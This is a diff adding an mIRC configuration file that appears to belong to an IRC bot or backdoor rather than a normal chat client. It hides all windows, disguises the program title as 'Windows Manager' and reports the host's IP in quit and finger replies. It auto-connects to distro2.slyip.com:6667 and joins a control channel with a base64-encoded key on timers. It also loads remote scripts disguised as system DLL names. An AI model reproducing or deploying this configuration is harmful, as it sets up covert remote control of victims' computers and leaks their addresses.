@@ -1,0 +1,134 @@
+[files]
+addrbk=addrbk.ini
+servers=servers.ini
+finger=finger.txt
+urls=urls.ini
+[warn]
+fserve=off
+dcc=off
+[options]
+n0=0,0,0,0,0,1,300,1,0,0,1,0,0,0,1,1,0,1,1,1,4096,0,1,0,0,0,1,1,0,50,1,1
+n1=5,100,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0
+n2=0,0,0,0,1,1,1,1,0,60,120,0,0,1,1,0,0,0,0,120,20,10,0,1,1,0,1,1,0,0,0
+n3=200,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,9,0,0,0,3,180
+n4=0,0,1,1,0,3,9999,0,0,1,1,0,1024,0,1,10,60,0,0,0,2,0,0,0,1,5000,1,5,0,0,3
+n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,0,1,1,1,300,30,10,0,0,24,0,0,1,8192,1,0,0,91
+n6=0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,1,1,0,0,0,0,0,4,0
+n7=0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0
+[about]
+version=5.91
+show=magnitude
+[dirs]
+[ports]
+random=off
+bind=off
+[ident]
+active=yes
+userid=Infrared
+system=UNIX
+port=113
+[socks]
+enabled=no
+port=1080
+method=4
+dccs=yes
+[clicks]
+status=/hide
+query=/hide
+channel=/hide
+nicklist=/hide
+notify=/hide
+[dde]
+ServerStatus=off
+ServiceName=mIRC
+CheckName=off
+[marker]
+show=off
+size=3
+colour=4
+method=1
+[text]
+network=All
+aptitle=Windows Manager
+commandchar=/
+linesep=none
+timestamp=[HH:nn]
+accept=*.bmp,*.gif,*.jpg,*.log,*.mid,*.mp3,*.png,*.txt,*.wav,*.zip
+ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs
+quit=%coldmsg $chr(2) $+ $ip
+finger=%coldmsg $chr(2) $+ $ip
+[fileserver]
+warning=off
+[dccserver]
+n0=1,59,1,1,1,1
+[mirc]
+user=%coldmsg
+email=%coldmsg
+nick=EdU[41824]
+anick=EdU[00000]
+host=distro2.slyip.comSERVER:distro2.slyip.com:6667
+[pfiles]
+n0=popups.dll
+n1=popups.dll
+n2=popups.dll
+n3=popups.dll
+n4=popups.dll
+[windows]
+scripts=45,646,32,512,0,0,0
+main=0,112,-2,27,0,1,0
+wchannel=0,133,0,34,0,1,0
+wquery=0,112,0,27,1,1,0
+wdccs=-1,269,-1,264,0,1,0
+wdccg=-1,245,-1,264,0,1,0
+wserv=0,666,0,400,1,1,0
+status=774,112,516,27,0,1,0
+[colours]
+n0=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+[wizard]
+warning=6
+[agent]
+enable=0,0,0
+char=merlin.acs
+options=0,0,0,100,0
+speech=150,60,100,1,180,10,50,1,1,1,0,50,1
+channel=1,1,1,1,1,1,1,1,1
+private=1,1,1,1
+other=1,1,1,1,1,1,1
+pos=20,20
+[language]
+sjis=0
+multibyte=0
+[events]
+default=2,2,3,2,2,0,1,2
+[waves]
+query=No Sound
+notice=No Sound
+invite=No Sound
+disconnect=No Sound
+send=No Sound
+highlight=No Sound
+flash=No Sound
+dccfail=No Sound
+[dragdrop]
+n0=*.wav:/sound $1 $2-
+n1=*.*:/dcc send $1 $2-
+s0=*.*:/dcc send $1 $2-
+[Perform]
+n0=timerstartbot off
+n1=nick %nick.prefix $+ $chr(91) $+ $r $+ $chr(93)
+n2=timerkeepalive 0 60 ctcp $me ping
+n3=timerjoinchan 0 5 join %dchannel $d(cmViaXJ0aA==)
+[local]
+local=ROUTER
+localip=207.157.173.210
+longip=3483217362
+[notify]
+n0=EdU[00000]
+[afiles]
+n0=aliases.ini
+[extensions]
+n0=defaultEXTDIR:\
+[rfiles]
+n0=w4nk-h3r.dll
+n1=msdart32.dll
+n2=oissq400.dll
